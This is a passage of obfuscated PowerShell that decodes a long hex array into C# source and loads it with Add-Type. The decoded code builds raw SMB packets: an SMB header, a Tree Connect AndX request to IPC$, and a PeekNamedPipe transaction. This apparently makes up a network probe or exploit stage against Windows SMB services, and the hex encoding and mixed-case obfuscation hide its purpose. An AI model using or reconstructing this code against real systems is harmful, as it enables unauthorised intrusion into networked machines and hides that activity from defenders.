30, 30,'2c', 30,78 , 30 ,30,'2c', 'd' , 'a',9,9, 9, 9, 30 , 78, 30 , 30, '2c' , 30 ,78 ,30 ,30 , '2c',30 ,78 ,30,30, '2c' ,30 ,78, 30 , 30,'2c' , 30, 78, 30 , 30,'2c', 30, 78, 30,30 , '2c' , 30 , 78 , 30 , 30, '2c',30,78 ,30 ,30,'2c' ,'d' , 'a',9, 9 ,9, 9, 30 , 78 , 30, 30 , '2c' ,30 ,78 ,30 ,30 ,'2c','d' ,'a' , 9 ,9,9,9,64 , 61 ,74 ,61 , '5b',32 , 38, '5d','2c', 64 , 61 ,74 , 61 , '5b', 32,39 , '5d' ,'2c',64,61 ,74 ,61 , '5b' ,33, 30,'5d', '2c' ,64,61, 74,61 , '5b',33 ,31 , '5d','2c', 64,61 ,74, 61 ,'5b', 33,32 ,'5d', '2c' ,64 ,61,74,61 ,'5b' ,33 ,33 , '5d', '2c' ,'d' , 'a' , 9,9 , 9 ,9,30 ,78 , 34 ,32,'2c' , 30 , 78, 63 ,31 , '2c','d' , 'a' , 9, 9,9 ,9 , 30 , 78,30, 64 , '2c' , 'd' , 'a' , 9 ,9 , 9 , 9 ,30 , 78, 66,66,'2c' ,'d' ,'a' , 9 , 9, 9,9 , 30 ,78 ,30 ,30,'2c' ,'d','a', 9, 9 ,9, 9 , 30, 78 , 30 , 30, '2c' , 30,78 , 30,30, '2c','d','a' ,9, 9, 9 ,9,30 , 78 ,64,66,'2c' , 30 ,78 , 66, 66 ,'2c','d' ,'a',9, 9 , 9 , 9 ,30,78 ,30 ,32,'2c', 30 , 78 , 30 ,30,'2c' ,'d', 'a', 9 , 9,9, 9,30,78 ,30, 31,'2c',30,78,30 , 30 ,'2c', 'd' ,'a', 9,9,9, 9, 30, 78 , 30 ,30 , '2c' , 30,78 ,30 ,30 , '2c' ,30 , 78 , 30, 30,'2c' , 30 , 78,30 , 30 , '2c' ,'d' , 'a',9, 9,9, 9, 30 ,78 ,30 , 30 ,'2c' ,30 , 78 ,30, 30 ,'2c', 'd', 'a',9,9, 9,9 , 30 , 78,30 ,30, '2c', 30,78,30 ,30,'2c','d', 'a', 9 , 9 ,9,9 ,30,78 , 30,30,'2c' ,30 , 78 ,30,30,'2c', 30 ,78 , 30,30, '2c' ,30,78 , 30 ,30, '2c' , 'd','a', 9,9 , 9 ,9,30 , 78, 34,30 ,'2c' ,30 ,78,30 ,30 ,'2c' , 30,78,30, 30,'2c',30,78, 30 ,30 ,'2c', 'd','a',9 ,9,9 ,9,30 ,78,32,36, '2c' , 30 , 78, 30,30,'2c' , 'd', 'a' , 9,9, 9 ,9 ,30,78,30 , 30 ,'2c' , 'd','a' , 9,9 , 9 ,9 ,30 , 78 , 32, 65 ,'2c',30, 78, 30 , 30, '2c','d' , 'a',9 , 9 , 9 ,9, 30 ,78 ,35 , 37 ,'2c' , 30,78 , 36,39,'2c' ,30 ,78,36 , 65 ,'2c' , 30 ,78,36, 34 ,'2c' , 30,78 , 36, 66 , '2c', 30 ,78 , 37,37 ,'2c', 30, 78 , 37 ,33, '2c' ,30 ,78 ,32,30 ,'2c', 30, 78 , 33, 32,'2c' , 30 , 78 , 33,30,'2c' , 30 ,78,33 , 30,'2c' , 30 , 78,33 ,30 ,'2c', 30, 78,32,30 , '2c',30 , 78 ,33 ,32 , '2c',30,78, 33 ,31,'2c' , 30 ,78, 33, 39 ,'2c', 30,78, 33,35 ,'2c', 30 , 78,30,30,'2c' ,'d' ,'a',9 ,9,9 ,9,30 ,78 ,35,37 , '2c' , 30, 78 , 36 , 39, '2c',30 ,78 ,36 , 65 , '2c', 30, 78, 36,34 ,'2c' ,30 , 78 ,36 , 66 , '2c' , 30,78,37, 37 ,'2c' , 30 , 78,37,33,'2c',30, 78,32, 30 ,'2c',30 ,78,33 ,32 ,'2c' ,30 ,78, 33,30, '2c' , 30 , 78, 33, 30, '2c',30 , 78 ,33 ,30 , '2c', 30 ,78 , 32, 30, '2c', 30, 78,33 ,35 , '2c' , 30,78, 32, 65,'2c' , 30,78,33, 30, '2c' , 30,78 ,30,30 ,'d','a',9 , 9, 9 ,'7d' , '3b', 'd' , 'a' ,9, 9, 9 ,72, 65 ,74 ,75, 72,'6e' ,20, 45 ,'6e', 63,'6f' , 64 ,65,'4e', 65, 74 ,42 ,69 ,'6f' ,73, '4c', 65 ,'6e', 67 ,74 , 68 ,28 ,'6f',75, 74,70 ,75,74, 29, '3b' ,'d' ,'a',9, 9, '7d' ,'d' , 'a', 'd','a' ,9 ,9,70,72,69,76, 61 ,74, 65 ,20 ,73, 74, 61, 74 , 69, 63 , 20, 62,79 ,74,65,'5b' ,'5d' , 20,45 , '6e' ,63,'6f' , 64 , 65 ,'4e',65, 74 ,42 ,69 , '6f' ,73, '4c' ,65,'6e' , 67,74,68, 28,62 ,79 , 74, 65,'5b' ,'5d',20,69 , '6e' ,70, 75,74 , 29, 'd' ,'a',9,9, '7b','d' , 'a', 9, 9, 9 ,62, 79,74 ,65 ,'5b','5d' ,20 , '6c' , 65, '6e' , 20, '3d' ,20 , 42,69 ,74 ,43 ,'6f','6e', 76 , 65,72,74 , 65 ,72 , '2e' , 47, 65 ,74 ,42 ,79 , 74 , 65,73,28, 69,'6e',70 ,75 , 74,'2e' , '4c' ,65 ,'6e' ,67 ,74 , 68,'2d' , 34,29,'3b','d','a', 9, 9,9 , 69,'6e' ,70,75, 74 ,'5b' ,33 ,'5d' ,20 , '3d', 20 , '6c' , 65, '6e' , '5b', 30 ,'5d','3b','d','a', 9 , 9 ,9 ,69 ,'6e' , 70,75,74, '5b' , 32 , '5d',20 , '3d',20, '6c',65,'6e', '5b' ,31 ,'5d', '3b' , 'd' , 'a', 9 ,9 , 9 , 69,'6e' , 70 ,75 , 74, '5b' ,31 , '5d' , 20 ,'3d' , 20, '6c',65,'6e', '5b' ,32, '5d', '3b','d' , 'a' ,9, 9,9 ,72,65,74, 75,72 , '6e', 20 ,69, '6e' ,70, 75,74, '3b' ,'d' ,'a' ,9 ,9 ,'7d' ,'d','a', 'd' ,'a' ,9, 9,73, 74, 61 ,74 , 69 ,63 ,20,62 ,79, 74,65 ,'5b', '5d', 20, 47, 65 , 74, 54, 72, 65 , 65 , 43, '6f', '6e', '6e', 65 ,63,74, 41, '6e' ,64 ,58,52,65,71 , 75 ,65,73, 74 , 28,62, 79,74 ,65, '5b' ,'5d' , 20, 64 , 61 ,74 ,61, '2c', 20 , 73 ,74 ,72, 69, '6e',67, 20, 63,'6f' ,'6d', 70 , 75 , 74 , 65,72 , 29, 'd','a',9, 9 , '7b' , 'd' ,'a' ,9 ,9,9 ,'4d',65 , '6d', '6f' , 72, 79 ,53,74 ,72,65 , 61 ,'6d',20,'6d' , 73 , 20 , '3d' ,20, '6e' , 65 ,77 , 20, '4d', 65, '6d', '6f' , 72 , 79, 53 , 74, 72 ,65, 61, '6d',28 ,29, '3b' ,'d', 'a', 9 , 9, 9 , 42 , 69,'6e' , 61,72,79,52 , 65, 61 , 64 , 65 , 72 ,20, 72, 65, 61 ,64 , 65, 72 , 20 ,'3d' ,20,'6e' ,65,77 , 20 , 42 ,69,'6e' , 61 ,72,79, 52 ,65, 61, 64 , 65, 72 , 28 ,'6d',73 , 29 , '3b','d' , 'a',9, 9 ,9 , 62 , 79 ,74, 65 ,'5b', '5d', 20, 70 ,61 , 72 , 74 ,31 , 20,'3d' , 20, '6e' ,65,77,20 ,62, 79 , 74 , 65, '5b', '5d',20 ,'7b' ,'d' ,'a', 9 ,9,9 , 9,30,78, 30, 30 ,'2c' ,30 , 78 ,30 ,30 ,'2c' ,30 , 78,30 ,30 ,'2c',30,78 ,30 ,30 , '2c' , 'd', 'a', 9 , 9 , 9, 9,30 , 78 ,66, 66,'2c', 30 ,78 , 35 ,33,'2c' ,30,78,34 ,64, '2c',30, 78,34,32 , '2c', 'd' , 'a',9 ,9, 9 , 9,30,78 ,37 ,35 , '2c' , 'd' ,'a', 9,9,9,9 , 30,78 ,30 , 30,'2c', 'd', 'a' ,9 , 9,9, 9 , 30, 78,30 , 30,'2c','d' ,'a' , 9 , 9, 9,9,30 ,78,30, 30, '2c' ,30 , 78 , 30,30,'2c' , 'd' , 'a', 9,9,9 ,9 , 30 ,78, 31, 38 ,'2c' , 'd','a', 9,9 ,9 , 9 , 30 ,78 ,30 , 31, '2c', 30,78 , 32 , 38 ,'2c' ,'d' , 'a',9 ,9 , 9,9,30, 78 , 30, 30 ,'2c',30 ,78 ,30, 30 ,'2c', 'd' ,'a' ,9 ,9, 9 ,9 , 30 ,78,30,30 , '2c',30,78, 30,30 ,'2c', 30 , 78 , 30,30 ,'2c', 30, 78 ,30, 30,'2c',30,78, 30,30,'2c' , 30 , 78 ,30 , 30, '2c', 30 , 78 , 30, 30,'2c', 30 ,78, 30, 30 ,'2c','d' ,'a' ,9 ,9 ,9 ,9, 30 ,78 ,30 ,30, '2c' ,30 ,78 , 30, 30, '2c', 'd' , 'a',9,9 , 9, 9,64,61 , 74,61, '5b' , 32, 38 , '5d', '2c' , 64, 61 , 74 , 61 , '5b',32,39 , '5d','2c', 64,61, 74 , 61, '5b' , 33,30,'5d','2c', 64,61,74,61 ,'5b' ,33 , 31,'5d' , '2c', 64 ,61, 74, 61,'5b' , 33,32 , '5d' , '2c', 64 , 61,74 ,61 , '5b' ,33,33,'5d' , '2c' ,'d' ,'a' ,9, 9 ,9 , 9, 30 ,78 , 34,32, '2c',30 , 78,63,31 , '2c', 'd' ,'a', 9 ,9 , 9 ,9, 30,78,30 ,34 , '2c' ,'d', 'a', 9, 9,9, 9, 30, 78, 66, 66, '2c', 'd' , 'a' ,9 ,9,9, 9,30 ,78 ,30,30, '2c' , 'd' , 'a' ,9, 9, 9 , 9, 30,78, 30 , 30,'2c' , 30,78 ,30, 30 , '2c' , 'd', 'a' ,9, 9,9 ,9 , 30 , 78,30 ,30, '2c' , 30 , 78 , 30 ,30,'2c' , 'd', 'a' , 9 , 9,9 , 9, 30,78,30 , 31 ,'2c' ,30,78 ,30 ,30 ,'2c' ,'d' ,'a',9, 9, 9, 9, 30 ,78, 31, 39 , '2c',30 ,78, 30 ,30,'2c' , 'd', 'a' , 9,9 ,9,9,30 , 78, 30, 30 ,'2c','d','a' ,9, 9,9 , 9 ,30 ,78,35 ,63 ,'2c' ,30, 78, 35 , 63 ,'7d','3b','d','a' ,9 , 9 , 9 ,62, 79 , 74 ,65,'5b', '5d', 20 ,70, 61 ,72, 74 ,32 ,20 , '3d' , 20 ,'6e' , 65 ,77 ,20, 62,79,74 ,65 , '5b' ,'5d' , 20 , '7b' ,'d' , 'a' ,9, 9 ,9 ,9 , 30 ,78 ,35 ,63,'2c', 30,78 ,34,39 ,'2c' ,30, 78 ,35,30 , '2c' ,30,78, 34, 33,'2c',30 , 78 , 32 ,34,'2c',30,78 , 30 ,30 , '2c','d','a' ,9,9,9, 9,30, 78,33,66 , '2c' , 30 ,78 ,33 , 66 ,'2c', 30 ,78 ,33 ,66, '2c' , 30 , 78, 33, 66, '2c' ,30 ,78 ,33, 66,'2c',30 ,78 ,30 , 30 ,'d' ,'a',9, 9,9 ,'7d' ,'3b' , 'd' , 'a',9 ,9 ,9 , '6d', 73 , '2e',57 ,72,69,74, 65 , 28 , 70,61 ,72 ,74,31 ,'2c' ,20 , 30 , '2c',20 ,70,61 ,72, 74, 31 ,'2e','4c' ,65,'6e' , 67, 74 ,68 ,29 , '3b', 'd' , 'a' ,9, 9, 9 , 62 ,79 , 74, 65, '5b' , '5d',20 ,65, '6e' ,63 , '6f' , 64,65,64 , 63 ,'6f', '6d' , 70,75 , 74, 65 , 72, 20, '3d', 20 , '6e' , 65 , 77 ,20 ,41 , 53 , 43 , 49, 49,45 ,'6e' , 63 ,'6f' , 64,69, '6e' , 67,28 , 29 ,'2e' ,47,65 , 74 ,42 , 79 ,74,65,73,28, 63 ,'6f' , '6d', 70, 75, 74, 65 ,72, 29, '3b','d' ,'a' , 9 , 9 ,9,'6d' ,73 , '2e', 57 ,72 , 69 , 74 , 65, 28 ,65 ,'6e', 63,'6f', 64 ,65,64, 63 , '6f', '6d',70 ,75 , 74,65 , 72 ,'2c', 20 ,30 , '2c' , 20 ,65, '6e' ,63 ,'6f' ,64, 65 , 64,63 , '6f' ,'6d', 70, 75, 74 , 65, 72,'2e', '4c' , 65 , '6e' , 67 , 74,68,29 ,'3b', 'd' , 'a',9 ,9,9 , '6d', 73,'2e' ,57, 72,69, 74 , 65, 28,70 ,61 , 72 ,74, 32 , '2c' , 20,30 ,'2c',20, 70 ,61,72,74,32,'2e' ,'4c' ,65 , '6e' ,67,74, 68 , 29, '3b','d' , 'a' ,9 ,9 , 9 ,'6d' ,73, '2e' ,53 ,65, 65 ,'6b' , 28, 30,'2c' ,20 , 53 , 65, 65, '6b' , '4f',72 , 69 ,67 ,69 ,'6e', '2e' ,42 ,65 ,67, 69 ,'6e',29, '3b', 'd' ,'a' ,9 , 9 ,9, 62 ,79, 74 ,65 ,'5b', '5d', 20, '6f', 75,74 ,70,75 , 74 ,20 ,'3d', 20, 72 ,65,61,64 , 65 , 72,'2e' , 52 ,65,61, 64,42 , 79,74 , 65, 73,28,28 ,69 ,'6e',74 , 29 ,20 ,72 ,65, 61,64 , 65,72,'2e', 42,61 ,73,65 , 53,74,72,65, 61 , '6d' , '2e', '4c',65,'6e' , 67,74 , 68 , 29, '3b' ,'d' ,'a',9 , 9,9, 72 , 65,74, 75 ,72, '6e',20, 45 ,'6e' ,63 ,'6f' , 64 , 65 , '4e' ,65, 74, 42 , 69,'6f', 73,'4c' , 65, '6e',67,74 ,68 ,28 ,'6f',75 ,74, 70,75,74, 29 ,'3b' ,'d' ,'a' , 9, 9,'7d' ,'d','a' ,'d','a' ,9 ,9,73,74 , 61 , 74,69, 63,20,62,79,74 ,65,'5b' ,'5d',20 ,47,65, 74,50 ,65 , 65 ,'6b','4e', 61 ,'6d',65,64 , 50 , 69, 70,65,28 ,62 ,79 , 74, 65, '5b', '5d', 20,64, 61 ,74 , 61,29, 'd' ,'a',9 , 9 ,'7b','d', 'a' , 9 , 9, 9, 62 , 79 ,74 , 65 ,'5b','5d', 20 ,'6f', 75 , 74 , 70,75, 74,20 ,'3d' ,20 , '6e', 65,77 ,20,62, 79 ,74, 65,'5b', '5d', 20 ,'7b' ,'d', 'a', 9, 9 , 9,9 , 30, 78 ,30, 30 ,'2c' ,30,78,30 ,30, '2c', 30 , 78 , 30 , 30 ,'2c',30 , 78 ,30, 30,'2c','d' , 'a',9 , 9 , 9 , 9,30 ,78 , 66 ,66 , '2c', 30,78 , 35 ,33,'2c',30 , 78 , 34, 64 , '2c' ,30 , 78, 34 ,32 ,'2c','d' , 'a', 9 ,9,9 , 9 ,30 , 78 , 32 ,35 ,'2c' ,'d' , 'a' , 9, 9, 9 , 9, 30, 78, 30 ,30, '2c', 'd','a',9, 9 ,9 , 9 ,30,78, 30 ,30,'2c','d', 'a' , 9, 9, 9, 9 ,30,78 , 30 , 30 , '2c' , 30 , 78, 30 ,30, '2c', 'd', 'a' , 9, 9,9 , 9 ,30,78 ,31 ,38, '2c' ,'d' , 'a',9, 9, 9, 9 , 30, 78, 30 , 31 , '2c', 30 ,78,32 , 38 , '2c', 'd' , 'a',9 , 9 ,9 ,9,30, 78, 30,30 , '2c' , 30, 78 ,30 ,30 ,'2c', 'd','a' , 9,9, 9 ,9,30,78 , 30, 30 , '2c' , 30, 78 ,30, 30,'2c',30 ,78 ,30, 30,'2c',30 ,78, 30 ,30,'2c' , 30 , 78,30, 30 ,'2c' ,30, 78 ,30, 30 ,'2c' , 30 ,78,30 ,30,'2c', 30 , 78,30 , 30,'2c', 'd','a', 9 , 9 , 9, 9, 30,78 ,30 , 30 ,'2c' ,30 ,78, 30 , 30, '2c','d','a', 9 ,9, 9,9 , 64 , 61, 74 , 61 ,'5b', 32,38,'5d', '2c', 64 ,61,74 , 61,'5b', 32, 39, '5d', '2c' , 64, 61,74,61 , '5b' , 33 ,30, '5d' ,'2c' , 64 ,61 ,74, 61 , '5b',33, 31 , '5d','2c' , 64,61,74,61 , '5b', 33 , 32 , '5d', '2c' , 64 , 61 ,74 ,61, '5b' ,33, 33,'5d' ,'2c', 'd' ,'a' ,9,9, 9, 9,30,78, 34 ,32,'2c',30 ,78 ,63, 31, '2c', 'd' , 'a',9 , 9,9 , 9, 30,78 ,31,30,'2c', 'd' , 'a' ,9, 9 ,9, 9 ,30 ,78 , 30,30, '2c' ,30 ,78 ,30,30,'2c' , 'd','a', 9 ,9,9, 9 ,30, 78 ,30, 30 , '2c' ,30 ,78, 30, 30, '2c', 'd', 'a' , 9, 9,9, 9 ,30, 78,66 , 66 ,'2c' , 30,78 , 66, 66 ,'2c' , 'd', 'a',9 , 9 , 9 , 9 ,30,78 ,66 ,66, '2c' , 30, 78 ,66 , 66, '2c','d', 'a' ,9 ,9,9,9 , 30,78, 30 ,30 ,'2c' , 'd' ,'a', 9 , 9,9, 9 ,30 , 78, 30 , 30 , '2c','d' ,'a' , 9, 9, 9 , 9,30 , 78 , 30 , 30 ,'2c' , 30 , 78 ,30,30 ,'2c' , 'd','a', 9, 9 ,9 , 9 , 30 ,78 , 30 , 30 , '2c',30 ,78 , 30,30, '2c' ,30,78,30 ,30,'2c' , 30 , 78, 30 ,30, '2c' ,'d','a', 9 , 9 , 9, 9 , 30,78, 30 , 30, '2c',30 , 78 , 30, 30,'2c' ,'d' , 'a', 9 ,9 , 9,9,30 ,78,30 , 30, '2c', 30, 78,30, 30 , '2c' , 'd' , 'a' ,9 , 9 ,9,9,30 ,78 ,34 ,61 , '2c' , 30, 78,30,30, '2c' , 'd' ,'a' , 9 ,9 , 9 , 9, 30, 78,30,30, '2c',30,78,30 , 30, '2c' ,'d' ,'a', 9 ,9 , 9,9,30 ,78 , 34,61, '2c' , 30 ,78, 30 , 30 , '2c' ,'d', 'a', 9, 9 , 9, 9 ,30, 78 ,30 ,32,'2c' ,'d' ,'a' , 9,9, 9, 9, 30 ,78 , 30 ,30, '2c' , 'd', 'a',9, 9, 9 ,9, 30, 78 ,32,33, '2c',30,78,30 , 30,'2c' , 'd','a', 9, 9 , 9 , 9 ,30 ,78, 30, 30,'2c', 30,78,30,30 ,'2c' , 'd' , 'a', 9,9 , 9 ,9 ,30, 78,30,37,'2c', 30 ,78,30,30, '2c' ,'d','a' ,9 , 9 ,9 , 9 , 30 , 78, 35 ,63 , '2c', 30 ,78 , 35 ,30, '2c' ,30 , 78, 34, 39 , '2c',30 , 78, 35 , 30 , '2c' ,30 , 78 ,34 , 35, '2c' ,30 , 78,35,63, '2c' , 30 , 78,30 ,30, 'd', 'a', 9, 9 ,9, '7d' , '3b', 'd' ,'a', 9 ,9 ,9,72,65,74 , 75 , 72, '6e' , 20 ,45, '6e' , 63,'6f' ,64 , 65 , '4e' ,65 ,74 ,42 , 69 , '6f',73 , '4c' ,65, '6e' ,67, 74,68, 28, '6f', 75, 74, 70, 75,74 ,29 ,'3b', 'd' , 'a', 9,9,'7d' , 'd','a', 9, '7d','d', 'a', '7d' ,'d','a' , 22 , 40,'d' , 'a',61 ,60 ,64 ,64 , 60 ,'2d' , 54 , 79, 70,45 ,20 ,'2d',54,79 , 70, 65 , 44 , 65,66, 69, '6e',69 ,74, 69 ,'6f','6e' ,20,24,53 , '6f',75 ,72 , 63 ,65,'d','a')| fOreacH{ ([CONVErt]::tOint16( ($_.tostRINg()) , 16 )-AS[ChaR])} ) ) )

